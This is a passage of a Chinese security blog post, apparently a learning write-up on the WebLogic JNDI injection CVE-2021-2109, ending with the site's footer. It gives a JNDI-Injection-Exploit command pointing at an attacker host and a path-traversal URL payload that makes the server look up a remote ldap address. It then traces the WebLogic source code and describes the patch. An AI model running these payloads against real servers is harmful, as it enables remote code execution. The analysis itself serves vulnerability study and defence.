+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>原理就是WebLogic 的 <code>/console/consolejndi.portal</code> 接口可以调用存在 JNDI 注入漏洞的 <code>com.bea.console.handles.JndiBindingHandle</code> 类，从而造成 RCE，所以要在进后台的前提下才能打</p>
+<p>这里用到的工具为：https://github.com/welk1n/JNDI-Injection-Exploit</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#34;touch /tmp/jndi_test&#34; -A 192.168.2.1</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442bb6338.png" alt="image-20250506171207587" srcset="https://bu.dusays.com/2025/05/11/6820442bb6338.png?size=small, https://bu.dusays.com/2025/05/11/6820442bb6338.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442bb6338.png?size=large 2x" data-title="image-20250506171207587" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>payload为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.2;1:1389/mezyww;AdminServer%22)</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204426d66e2.png" alt="image-20250506171326607" srcset="https://bu.dusays.com/2025/05/11/68204426d66e2.png?size=small, https://bu.dusays.com/2025/05/11/68204426d66e2.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204426d66e2.png?size=large 2x" data-title="image-20250506171326607" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里就是 <code>;</code> 而不是 <code>.</code></p>
+<p>看到 <code>\server\lib\consoleapp\webapp</code> 下的 <code>consolejndi.portal</code> ，就是我们刚才 payload 中访问的路由</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442a1d01d.png" alt="image-20250506175245640" srcset="https://bu.dusays.com/2025/05/11/6820442a1d01d.png?size=small, https://bu.dusays.com/2025/05/11/6820442a1d01d.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442a1d01d.png?size=large 2x" data-title="image-20250506175245640" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>具体的处理逻辑在 <code>/PortalConfig/jndi/jndibinding.portlet</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442b45d28.png" alt="image-20250506180515325" srcset="https://bu.dusays.com/2025/05/11/6820442b45d28.png?size=small, https://bu.dusays.com/2025/05/11/6820442b45d28.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442b45d28.png?size=large 2x" data-title="image-20250506180515325" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以发现在 <code>com.bea.console.actions.jndi.JNDIBindingAction#execute</code> 中就是处理逻辑</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820443011a92.png" alt="image-20250506205421771" srcset="https://bu.dusays.com/2025/05/11/6820443011a92.png?size=small, https://bu.dusays.com/2025/05/11/6820443011a92.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820443011a92.png?size=large 2x" data-title="image-20250506205421771" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>先获取 jndi 上下文然后就直接 lookup 了，现在先看下怎么控制 serverMBean 了，而一直往上追溯其赋值，大概可以用下面这个赋值链表示</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">JndiBindingHandle bindingHandle = (JndiBindingHandle)this.getHandleContext(actionForm, request, &#34;JNDIBinding&#34;);
+</span></span><span class="line"><span class="cl">-&gt;
+</span></span><span class="line"><span class="cl">String serverName = bindingHandle.getServer();
+</span></span><span class="line"><span class="cl">-&gt;
+</span></span><span class="line"><span class="cl">ServerMBean serverMBean = domainMBean.lookupServer(serverName);</span></span></code></pre></td></tr></table>
+</div>
+</div><p>从 <code>domainMBean.lookupServer(serverName)</code> 开始分析，这里是动态代理调用，用的是 <code>weblogic.management.jmx.MBeanServerInvocationHandler#invoke</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204430dc712.png" alt="image-20250506211514032" srcset="https://bu.dusays.com/2025/05/11/68204430dc712.png?size=small, https://bu.dusays.com/2025/05/11/68204430dc712.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204430dc712.png?size=large 2x" data-title="image-20250506211514032" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里 var2 就是要调用的方法 <code>weblogic.management.configuration.DomainMBean#lookupServer</code> ，var3 则是要传进去的参数，然后发现 var2 的实现类是 <code>weblogic.management.configuration.DomainMBeanImpl#lookupServer</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">ServerMBean</span><span class="w"> </span><span class="nf">lookupServer</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Iterator</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Arrays</span><span class="p">.</span><span class="na">asList</span><span class="p">((</span><span class="n">Object</span><span class="o">[]</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">_Servers</span><span class="p">).</span><span class="na">iterator</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ServerMBeanImpl</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">do</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">var2</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ServerMBeanImpl</span><span class="p">)</span><span class="n">var2</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">var3</span><span class="p">.</span><span class="na">getName</span><span class="p">().</span><span class="na">equals</span><span class="p">(</span><span class="n">var1</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">var3</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里 <code>this._Servers</code> 是一组服务器对象，会依次取出其中的实例并判断其 getName 返回的值是否为我们传进去的 var1</p>
+<p>我们肯定不能返回 null，所以我们必须要让传进去的 var1 等于其 getName 值，这里只有一个实例，其 getName 返回的值为 AdminServer</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204427191db.png" alt="image-20250506213012236" srcset="https://bu.dusays.com/2025/05/11/68204427191db.png?size=small, https://bu.dusays.com/2025/05/11/68204427191db.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204427191db.png?size=large 2x" data-title="image-20250506213012236" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>因此我们传入的 var1 值为 AdminServer ，根据之前我们的赋值链可以发现 var1 就是 serverName，跟进下 getServer 方法会发现其值是可控的，会返回 getComponent 方法获得的数组中索引为 2 的值，这个方法待会分析</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">    public String getServer() {
+</span></span><span class="line"><span class="cl">        return this.getComponent(2);
+</span></span><span class="line"><span class="cl">    }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>至此 <code>c != null</code> 已经可以满足，现在看看 jndi lookup 的地址怎么控制</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442f28dc9.png" alt="image-20250506213900415" srcset="https://bu.dusays.com/2025/05/11/6820442f28dc9.png?size=small, https://bu.dusays.com/2025/05/11/6820442f28dc9.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442f28dc9.png?size=large 2x" data-title="image-20250506213900415" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>跟进发现其两个 getter 方法都是调用的 ，而且都是用到 getComponent 方法返回的数组</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/68204428d074b.png" alt="image-20250506214010067" srcset="https://bu.dusays.com/2025/05/11/68204428d074b.png?size=small, https://bu.dusays.com/2025/05/11/68204428d074b.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/68204428d074b.png?size=large 2x" data-title="image-20250506214010067" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>最后跟进到 <code>com.bea.console.handles.HandleImpl#getComponents()</code> ，这个方法也很简单，就是用 <code>;</code> 来分隔数组中的每个组件</p>
+<p>所以最后构造 payload 的时候就很清晰了，写三个组件，前两个是 jndi 的远程地址，最后一个为 AdminServer 就好了，用 <code>;</code> 分隔</p>
+<h4 id="漏洞修复" class="heading-element"><span>漏洞修复</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>加了个函数来判断传进 lookup 方法的值</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/6820442ab2c23.png" alt="image-20250506215751500" srcset="https://bu.dusays.com/2025/05/11/6820442ab2c23.png?size=small, https://bu.dusays.com/2025/05/11/6820442ab2c23.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/6820442ab2c23.png?size=large 2x" data-title="image-20250506215751500" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>只允许以 <code>java:</code> 开头的本地 JNDI 名称，远程的如 rmi，ldap 就不行了</p>
+<h3 id="小结-1" class="heading-element"><span>小结</span>
+  <a href="#%e5%b0%8f%e7%bb%93-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>限制比较大感觉，要进后台，漏洞本身的利用思路还是非常有趣的</p>
+<h3 id="参考-1" class="heading-element"><span>参考</span>
+  <a href="#%e5%8f%82%e8%80%83-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><a href="https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/"target="_blank" rel="external nofollow noopener noreferrer">https://drun1baby.top/2023/02/12/CVE-2021-2109-WebLogic-JNDI-%E6%B3%A8%E5%85%A5/</a></p>
+<p><a href="https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/"target="_blank" rel="external nofollow noopener noreferrer">https://y4er.com/posts/weblogic-cve-2021-2109-jndi-rce/</a></p>
+<h2 id="总结" class="heading-element"><span>总结</span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>有总的利用脚本：https://github.com/zhzyker/exphub/tree/master/weblogic</p>
+<p>利用相对于反序列化简单很多，但限制都比较大感觉，Weblogic 暂时到这，之后遇到其他利用手法再说</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2025-05-11 14:18:30">更新于 2025-05-11&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"><span><a href="/posts/0846c48/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 X" data-sharer="twitter" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)" data-hashtags="Java"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/0846c48/" data-hashtag="Java"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)"><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>LINE</title><path d="M19.365 9.863c.349.0.63.285.63.631.0.345-.281.63-.63.63H17.61v1.125h1.755c.349.0.63.283.63.63.0.344-.281.629-.63.629h-2.386c-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63h2.386c.346.0.627.285.627.63.0.349-.281.63-.63.63H17.61v1.125h1.755zm-3.855 3.016c0 .27-.174.51-.432.596-.064.021-.133.031-.199.031-.211.0-.391-.09-.51-.25l-2.443-3.317v2.94c0 .344-.279.629-.631.629-.346.0-.626-.285-.626-.629V8.108c0-.27.173-.51.43-.595.06-.023.136-.033.194-.033.195.0.375.104.495.254l2.462 3.33V8.108c0-.345.282-.63.63-.63.345.0.63.285.63.63v4.771zm-5.741.0c0 .344-.282.629-.631.629-.345.0-.627-.285-.627-.629V8.108c0-.345.282-.63.63-.63.346.0.628.285.628.63v4.771zm-2.466.629H4.917c-.345.0-.63-.285-.63-.629V8.108c0-.345.285-.63.63-.63.348.0.63.285.63.63v4.141h1.756c.348.0.629.283.629.63.0.344-.282.629-.629.629M24 10.314C24 4.943 18.615.572 12 .572S0 4.943.0 10.314c0 4.811 4.27 8.842 10.035 9.608.391.082.923.258 1.058.59.12.301.079.766.038 1.08l-.164 1.02c-.045.301-.24 1.186 1.049.645 1.291-.539 6.916-4.078 9.436-6.975C23.176 14.393 24 12.458 24 10.314"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Myspace" data-sharer="myspace" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)" data-description=""><svg class="icon" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Myspace</title><path d="M19.802 12.274A3.811 3.811.0 0023.62 8.47c0-2.101-1.71-3.795-3.818-3.795a3.816 3.816.0 00-3.818 3.81 3.817 3.817.0 003.818 3.811zm-8.602.705a3.43 3.43.0 003.435-3.424A3.43 3.43.0 0011.2 6.13 3.44 3.44.0 007.764 9.566 3.436 3.436.0 0011.2 13zm-7.8.635c1.71.0 3.093-1.38 3.093-3.081.0-1.704-1.395-3.084-3.105-3.084A3.086 3.086.0 00.3 10.539c0 1.7 1.387 3.078 3.095 3.078zm0 .705c-1.96.0-3.4 1.717-3.4 3.495v1.196c0 .17.138.31.31.31h6.18a.31.31.0 00.309-.31v-1.196c0-1.779-1.437-3.5-3.398-3.5zm7.8-.56c-2.18.0-3.78 1.915-3.78 3.891v1.331c0 .188.156.344.345.344h6.87a.344.344.0 00.342-.344V17.65c0-1.976-1.598-3.891-3.777-3.891zm8.602-.617c-2.422.0-4.197 2.126-4.197 4.323v1.477c0 .21.172.381.382.381h7.63c.21.0.383-.171.383-.381v-1.477c-.001-2.197-1.776-4.323-4.198-4.323z"/></svg></a>
+  <a href="javascript:void(0);" title="分享到 Blogger" data-sharer="blogger" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="http://localhost:1313/posts/0846c48/" data-title="Weblogic学习(2)"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/java/" class="post-tag" title="标签 - Java">Java</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/705d533/" class="post-nav-item" rel="next" title="Weblogic学习(1)">Weblogic学习(1)<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.140.1"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.17-30a67c4b"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">6s6</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"typeit":{"cursorChar":"|","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.17-30a67c4b"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
